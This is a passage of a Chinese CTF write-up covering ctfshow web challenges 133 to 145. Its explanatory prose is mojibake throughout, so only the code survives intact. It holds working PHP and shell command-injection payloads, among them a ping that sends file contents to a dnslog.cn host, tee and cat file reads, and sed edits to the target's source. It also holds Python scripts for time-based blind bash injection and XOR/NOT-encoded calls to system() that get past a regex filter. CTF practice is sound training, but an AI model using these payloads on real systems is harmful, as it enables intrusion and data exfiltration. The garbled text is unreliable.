class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curlä¸å¸¦æœ‰ä»»ä½•å‚æ•°æ—¶ï¼Œcurl å°±æ˜¯å‘å‡º GET è¯·æ±‚ã€‚</span><br><span class="line">grepæŒ‡ä»¤ç”¨äºæŸ¥æ‰¾å†…å®¹åŒ…å«æŒ‡å®šçš„èŒƒæœ¬æ ·å¼çš„æ–‡ä»¶</span><br><span class="line">è¿™é‡Œå¯ä»¥ä½¿ç”¨dnså¤–å¸¦æŠŠflagå¸¦å‡ºæ¥</span><br><span class="line">ç”±äºflag.phpä¸­å†…å®¹å¤ªå¤šäº† éœ€è¦è¿›è¡Œæ ¼å¼åŒ– ä½¿ç”¨linuxçš„ tr -cd</span><br><span class="line">å› ä¸ºflagæ˜¯æ•°å­—åŠ å­—æ¯çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¯ä»¥ç”¨tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;</span><br><span class="line">uuid æ ¼å¼8-4-4-4-12   å°±æ˜¯æ¯éš”nä¸ªå­—ç¬¦ä¹‹é—´éƒ½ä¼šæœ‰ä¸€ä¸ª-</span><br></pre></td></tr></table></figure><p><a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html">http://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a>  curlå‘½ä»¤è®²è§£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-c, --complementï¼šåé€‰è®¾å®šå­—ç¬¦ã€‚ä¹Ÿå°±æ˜¯ç¬¦åˆ SET1 çš„éƒ¨ä»½ä¸åšå¤„ç†ï¼Œä¸ç¬¦åˆçš„å‰©ä½™éƒ¨ä»½æ‰è¿›è¡Œè½¬æ¢(payload&quot;&quot;é‡Œçš„ä¸œè¥¿å°±æ˜¯ç¬¦åˆçš„ï¼Œæ‰€ä»¥ä¸è¿›è¡Œè½¬æ¢æˆ–è€…æ¸…é™¤)</span><br><span class="line">-d, --deleteï¼šåˆ é™¤æŒ‡ä»¤å­—ç¬¦</span><br><span class="line">-s, --squeeze-repeatsï¼šç¼©å‡è¿ç»­é‡å¤çš„å­—ç¬¦æˆæŒ‡å®šçš„å•ä¸ªå­—ç¬¦</span><br><span class="line">-t, --truncate-set1ï¼šå‰Šå‡ SET1 æŒ‡å®šèŒƒå›´ï¼Œä½¿ä¹‹ä¸ SET2 è®¾å®šé•¿åº¦ç›¸ç­‰</span><br><span class="line">--helpï¼šæ˜¾ç¤ºç¨‹åºç”¨æ³•ä¿¡æ¯</span><br></pre></td></tr></table></figure><p><strong>è§£æ³•äºŒ</strong></p><p><a href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a>  è¿™æ˜¯å‡ºé¢˜äººè‡ªå·±å†™çš„wpï¼Œå¯ä»¥å»çœ‹çœ‹ï¼Œå› ä¸ºæˆ‘çš„bpä¸æ˜¯ä¸“ä¸šç‰ˆï¼Œç”¨ä¸äº†é‚£ä¸ªåŠŸèƒ½ï¼Œæ‰€ä»¥å°±æ¼”ç¤ºä¸äº†äº†ã€‚</p><p>æ€»ç»“ä¸€ä¸‹  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ— å›æ˜¾æˆ‘ä»¬å¯ä»¥ç”¨åå¼¹shell æˆ–è€…curlå¤–å¸¦ æˆ–è€…ç›²æ³¨ è¿™é‡Œçš„è¯åå¼¹æ²¡æœ‰æˆåŠŸï¼Œä½†æ˜¯å¯ä»¥å¤–å¸¦ã€‚</span><br></pre></td></tr></table></figure><h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222231203109.png" alt="image-20221222231203109"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222233123188.png" alt="image-20221222233123188"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222233130740.png" alt="image-20221222233130740"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class="line">extract($_POST);</span><br><span class="line">è¿™ä¸¤è¡Œä»£ç çš„è®²è§£ï¼Œä¸Šé¢çš„é¢˜æœ‰è¿‡è§£é‡Šï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payloadä¸ºä»€ä¹ˆå¯ä»¥è¿™æ ·å†™å‘¢ï¼Œé¦–å…ˆå°±æ˜¯$_SERVER[&#x27;QUERY_STRING&#x27;]ä¼šä»¥url/?=xxx  é—®å·åçš„é‚£å†…å®¹ç”¨&quot;xx&quot;ï¼Œå­˜å‚¨ä¸‹æ¥ï¼Œç„¶ååˆè¢«parse_str()è¿™ä¸ªå‡½æ•°åˆ†å‰²æˆæ•°ç»„çš„å½¢å¼å­˜å‚¨ä¸‹æ¥ï¼Œå°±æ˜¯key=key1,value=36d</span><br><span class="line">key=key2  value=36d</span><br><span class="line">extract($_POST);  è¿™ä¸ªæ˜¯å˜é‡è¦†ç›–ï¼Œå…¶ä»–çš„å‡½æ•°å¿…é¡»ä»¥postçš„å½¢å¼è¿›è¡Œè¾“å…¥ï¼Œé‚£ä¹ˆç”±äº$_SERVER[&#x27;QUERY_STRING&#x27;]åªèƒ½åœ¨getä¸Šè¾“å…¥ï¼Œæ‰€ä»¥å°±å¾—åœ¨getä¸Šè¿™æ ·å†™äº†  _POST[key1]=36d&amp;_POST[key2]=36d  ä»¥è¿™ç§å½¢å¼æ›¿ä»£postè¾“å…¥</span><br></pre></td></tr></table></figure><h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222234906905.png" alt="image-20221222234906905"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?F=`$F`; ping `nl flag.php|awk &#x27;NR==15&#x27;|tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.j4ko5o.dnslog.cn -c 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œawk &#x27;NR==15&#x27;è¡¨ç¤ºçš„æ˜¯è¯»å–ç¬¬å‡ è¡Œï¼Œè¿™æ˜¯ä»å‰é¢çš„flagå‡ºç°çš„ä½ç½®åˆ¤æ–­å‡ºæ¥çš„ã€‚ç„¶åå…¶ä»–æŒ‡ä»¤çš„æ„æ€web133æœ‰è®²</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å»é€šè¿‡danslogæŸ¥çœ‹æ‹¼æ¥flagå°±å¥½äº†ã€‚</p><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222235502578.png" alt="image-20221222235502578"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223151706052.png" alt="image-20221223151706052"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tee  aæŒ‡ä»¤ä¼šä»æ ‡å‡†è¾“å…¥è®¾å¤‡è¯»å–æ•°æ®ï¼Œå°†å…¶å†…å®¹è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ï¼ŒåŒæ—¶ä¿å­˜æˆæ–‡ä»¶aã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">å…ˆï¼š</span><br><span class="line">?c=ls | tee a</span><br><span class="line">ç„¶åè®¿é—®url/a,ç”µè„‘ä¼šè‡ªåŠ¨ä¸‹è½½ä¸€ä¸ªåä¸ºaçš„æ–‡ä»¶ï¼Œç„¶åæŸ¥çœ‹æ–‡ä»¶ï¼Œå‘ç°é‡Œé¢åªæœ‰index.php</span><br><span class="line"></span><br><span class="line">?c=ls / | tee b</span><br><span class="line">å‘ç°é‡Œé¢æœ‰f149_15_h3r3</span><br><span class="line"></span><br><span class="line">?c=cat /f149_15_h3r3 | tee c</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚</p><p><strong>è§£æ³•äºŒ</strong></p><p>è¿™ä¸ªæ¯”è¾ƒéªšï¼Œå°±æ˜¯æŠŠé¢˜ç›®éƒ½ç»™æ”¹äº†ã€‚</p><p><a href="https://blog.csdn.net/weixin_39731083/article/details/82495950">https://blog.csdn.net/weixin_39731083/article/details/82495950</a>  xargs sedå‘½ä»¤ä»‹ç»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€æ­¥ï¼šls | xargs sed -i &quot;s/die/echo/&quot;   --&gt;-iæ˜¯è¿›å…¥æ–‡æœ¬ç¼–è¾‘æ¨¡å¼ sæ˜¯è¡¨ç¤ºæ›¿æ¢ è¿™é‡Œæ˜¯æŠŠdieæ›¿æ¢æˆecho</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬äºŒæ­¥ï¼š ls | xargs sed -i &quot;s/exec/system/&quot;  /åé¢åŠ ä¸ªgçš„è¯æ˜¯å…¨å±€æ›¿æ¢ï¼Œä¸åŠ æ˜¯åªæ›¿æ¢åŒ¹é…åˆ°çš„ç¬¬ä¸€ä¸ª</span><br></pre></td></tr></table></figure><h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223154219888.png" alt="image-20221223154219888"></p><p>è¿™é“é¢˜è€ƒå¯Ÿäº†å°±æ˜¯å¦‚ä½•ä¸newä¸€ä¸ªå‚æ•°ä¹Ÿèƒ½è®¿é—®ç±»é‡Œè¾¹çš„å‡½æ•°ã€‚</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=ctfshow::getFlag  ---&gt;å°±æ˜¯  ç±»å::å‡½æ•°å  è¿™æ˜¯å‡½æ•°å¾—æ˜¯staticçš„æƒ…å†µä¸‹</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¸æ˜¯staticçš„æƒ…å†µ  ctfshow=call_user_func_array(array(new ctfshow(),&#x27;getFlag&#x27;))  ctfshow()---&gt;æ˜¯ç±»å   getFlagæ˜¯å‡½æ•°åã€‚</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223160407968.png" alt="image-20221223160407968"></p><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223160443873.png" alt="image-20221223160443873"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223161022503.png" alt="image-20221223161022503"></p><p>åˆ©ç”¨è¿™ä¸€å‡½æ•°çš„ç‰¹æ€§ï¼Œä¹Ÿæ˜¯ä¸ç”¨ï¼šï¼šçš„ä¸€ç§å†™æ³•</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223161241007.png" alt="image-20221223161241007"></p><h2 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223161625931.png" alt="image-20221223161625931"></p><p>å’Œweb136ä¸€æ ·ï¼Œä½†æ˜¯è¿™é¢˜çš„teeå’Œxargs sedç”¨ä¸äº†äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ‰€ä»¥å¾—ç”¨å‘½ä»¤æ‰§è¡Œçš„bashç›²æ³¨</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223175030609.png" alt="image-20221223175030609"></p><p>æ‹¿åˆ°æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f149_15_h3r3</span><br></pre></td></tr></table></figure><p><strong>ç¬¬ä¸€æ­¥æ‹¿æ ¹ç›®å½•ä¸‹çš„flagåå­—</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2021-10-04 08:43:04</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-10-04 12:03:52</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"><span class="comment"># /f149_15_h3r3</span></span><br><span class="line"><span class="comment"># ctfshow&#123;7bae6719-8739-4628-b57b-acf7a5fc4351&#125;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://35e55b2c-6023-4fc4-8835-40abd33dae52.challenge.ctf.show/?c=&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;if [ `cat /f149_15_h3r3  | cut -c &#123;&#125;` == \&quot;&#123;&#125;\&quot; ];then sleep 3;fi&quot;</span></span><br><span class="line">payload = <span class="string">&quot;if [ `ls / -1 | cut -c &#123;&#125; | awk \&#x27;NR==&#123;&#125;\&#x27;` == \&#x27;&#123;&#125;\&#x27; ];then sleep 4;fi&quot;</span>   <span class="comment">#cutæ˜¯æˆªæ–­çš„æ„æ€ï¼Œç¬¬ä¸€ä¸ªæ‹¬å·æ˜¯ä»£è¡¨æˆªæ–­ç¬¬å‡ ä¸ªå­—ç¬¦ awk &#x27;NR==&#123;&#125;&#x27; æ˜¯æŸ¥çœ‹ç¬¬å‡ è¡Œ  æœ€åä¸€ä¸ª&#123;&#125;ä»£è¡¨ç€é‡åˆ°å“ªä¸ªå­—ç¬¦å°±æˆªæ–­</span></span><br><span class="line"><span class="comment"># payloadçš„å«ä¹‰æ˜¯ï¼Œå¦‚æœé‡åˆ°è¯¥æˆªæ–­çš„å­—ç¬¦ï¼Œå°±ä¼šå»¶æ—¶3ç§’ï¼Œå¹¶è¿›è¡Œæˆªæ–­ã€‚</span></span><br><span class="line">result = <span class="string">&quot;+++++++++++++++++&quot;</span></span><br><span class="line">row=<span class="number">6</span></span><br><span class="line">length=<span class="number">20</span></span><br><span class="line"></span><br><span class="line">strings  = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz_-0123456789&quot;</span></span><br><span class="line"><span class="comment">#strings  = &quot;ctfshow&#125;abdefgijklmnpqruvwxyz_-0123456789&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,row):</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length):</span><br><span class="line"><span class="comment">#print(&quot;+++++++++++++++ç¬¬&quot;+str(c)+&quot;ä¸ªå­—ç¬¦&quot;)</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">target = url+payload.<span class="built_in">format</span>(c,i,s)    <span class="comment">#format()é‡Œé¢å¡«çš„ä¸œè¥¿æ˜¯ä¸Šé¢payload&#123;&#125;ä¸­çš„ä¸œè¥¿</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">requests.get(target,timeout=<span class="number">3</span>)  <span class="comment">#å¦‚æœè¯·æ±‚åœ¨3ç§’ä¹‹å†…å®Œæˆå°±ç»“æŸï¼Œå¦‚æœè¶…è¿‡3ç§’å°±ä¼šä»£è¡¨æ‰§è¡Œäº†sleep 4ï¼Œå°±ä¼šæ‰§è¡Œä¸‹é¢çš„except:</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">result +=s</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">result += <span class="string">&quot; &quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>ç¬¬äºŒæ­¥ï¼Œè¯»å–flag</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2021-10-04 08:43:04</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-10-04 12:03:52</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"><span class="comment"># /f149_15_h3r3</span></span><br><span class="line"><span class="comment"># ctfshow&#123;7bae6719-8739-4628-b57b-acf7a5fc4351&#125;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://35e55b2c-6023-4fc4-8835-40abd33dae52.challenge.ctf.show/?c=&quot;</span></span><br><span class="line">payload = <span class="string">&quot;if [ `cat /f149_15_h3r3  | cut -c &#123;&#125;` == \&quot;&#123;&#125;\&quot; ];then sleep 3;fi&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;if [ `ls / -1 | cut -c &#123;&#125; | awk \&#x27;NR==&#123;&#125;\&#x27;` == \&#x27;&#123;&#125;\&#x27; ];then sleep 4;fi&quot;   #cutæ˜¯æˆªæ–­çš„æ„æ€ï¼Œç¬¬ä¸€ä¸ªæ‹¬å·æ˜¯ä»£è¡¨æˆªæ–­ç¬¬å‡ ä¸ªå­—ç¬¦ awk &#x27;NR==&#123;&#125;&#x27; æ˜¯æŸ¥çœ‹ç¬¬å‡ è¡Œ  æœ€åä¸€ä¸ª&#123;&#125;ä»£è¡¨ç€é‡åˆ°å“ªä¸ªå­—ç¬¦å°±æˆªæ–­</span></span><br><span class="line"><span class="comment"># payloadçš„å«ä¹‰æ˜¯ï¼Œå¦‚æœé‡åˆ°è¯¥æˆªæ–­çš„å­—ç¬¦ï¼Œå°±ä¼šå»¶æ—¶3ç§’ï¼Œå¹¶è¿›è¡Œæˆªæ–­ã€‚</span></span><br><span class="line">result = <span class="string">&quot;+++++++++++++++++&quot;</span></span><br><span class="line"><span class="comment">#row=6</span></span><br><span class="line">length=<span class="number">48</span></span><br><span class="line"></span><br><span class="line">strings  = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz_-0123456789&quot;</span></span><br><span class="line"><span class="comment">#strings  = &quot;ctfshow&#125;abdefgijklmnpqruvwxyz_-0123456789&#123;&quot;</span></span><br><span class="line"><span class="comment">#for i in range(1,row):</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length):</span><br><span class="line"><span class="comment">#print(&quot;+++++++++++++++ç¬¬&quot;+str(c)+&quot;ä¸ªå­—ç¬¦&quot;)</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">target = url+payload.<span class="built_in">format</span>(c,s)    <span class="comment">#format()é‡Œé¢å¡«çš„ä¸œè¥¿æ˜¯ä¸Šé¢payload&#123;&#125;ä¸­çš„ä¸œè¥¿</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">requests.get(target,timeout=<span class="number">3</span>)  <span class="comment">#å¦‚æœè¯·æ±‚åœ¨3ç§’ä¹‹å†…å®Œæˆå°±ç»“æŸï¼Œå¦‚æœè¶…è¿‡3ç§’å°±ä¼šä»£è¡¨æ‰§è¡Œäº†sleep 4ï¼Œå°±ä¼šæ‰§è¡Œä¸‹é¢çš„except:</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">result +=s</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">result += <span class="string">&quot; &quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223180716378.png" alt="image-20221223180716378"></p><p>æŠŠflagå¤åˆ¶ä¸‹æ¥ï¼Œç„¶åæŠŠç©ºæ ¼å»æ‰ï¼Œè¡¥ä¸Š{}å°±èƒ½æ‹¿åˆ°flagäº†ã€‚</p><h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223182022441.png" alt="image-20221223182022441"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ€è·¯å°±æ˜¯è®©$codeç­‰äº0ï¼Œå› ä¸ºæ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œæ‰€ä»¥å¯ä»¥è®©0==&#x27;ctfshow&#x27;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223182148022.png" alt="image-20221223182148022"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f1=system&amp;f2=system   æŠŠsystemæ¢æˆvar_dumpä¹Ÿè¡Œ    exec/usleepä¹Ÿè¡Œï¼Œåº”è¯¥æœ‰å¾ˆå¤šï¼Œå¯ä»¥è‡ªå·±å»è¯•è¯•</span><br></pre></td></tr></table></figure><h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223202331719.png" alt="image-20221223202331719"></p><p>è¿™é‡Œåœ¨æœ¬åœ°è¯•äº†ä¸‹ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1+phpinfo()+1 ---&gt; æ˜¯å¯ä»¥æ‰§è¡Œå‡ºæ¥çš„ï¼Œæ‰€ä»¥è¿™é“é¢˜ä¹Ÿå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹ç‚¹ï¼Œ </span><br><span class="line">if(preg_match(&#x27;/^\W+$/&#x27;, $v3))  ----&gt;è¿™ä¸ªæ˜¯æ­£åˆ™çš„æ„æ€æ˜¯ä¸èƒ½å«æœ‰å­—æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å¼‚æˆ–æ¥è·å–å­—æ¯äº†ã€‚</span><br><span class="line">/^\W+$/ ä½œç”¨æ˜¯åŒ¹é…éæ•°å­—å­—æ¯ä¸‹åˆ’çº¿çš„å­—ç¬¦</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3=%2b(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%d5^%ff%ff%ff%ff%ff%ff)%2b</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&amp;v2=1</span><br></pre></td></tr></table></figure><p>æ— æ•°å­—å­—æ¯ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼æ€»ç»“    yuå¸ˆå‚…å†™çš„</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a>  </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205123698.png" alt="image-20221223205123698"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205156267.png" alt="image-20221223205156267"></p><h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205353234.png" alt="image-20221223205353234"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205452667.png" alt="image-20221223205452667"></p><h2 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223205853208.png" alt="image-20221223205853208"></p><p>å’Œweb141å·®ä¸å¤š</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223210018653.png" alt="image-20221223210018653"></p><p>ç”¨web141çš„payloadï¼Œç„¶åæŠŠ%2bæ¢æˆ*å·å°±è¡Œ</p><h2 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223210505198.png" alt="image-20221223210505198"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å°±æ˜¯ä¸ä¸€å®šå¾—æ˜¯è¿™ç§æ ¼å¼  1+phpinfo()+1   1+1+phpinfo()è¿™ç§å½¢å¼ä¹Ÿè¡Œ</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=-(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%d5^%ff%ff%ff%ff%ff%ff)&amp;v3=1</span><br><span class="line"></span><br><span class="line">//  å°±æ˜¯11-xxxxxx</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223210903738.png" alt="image-20221223210903738"></p><h2 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223211005710.png" alt="image-20221223211005710"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223211416842.png" 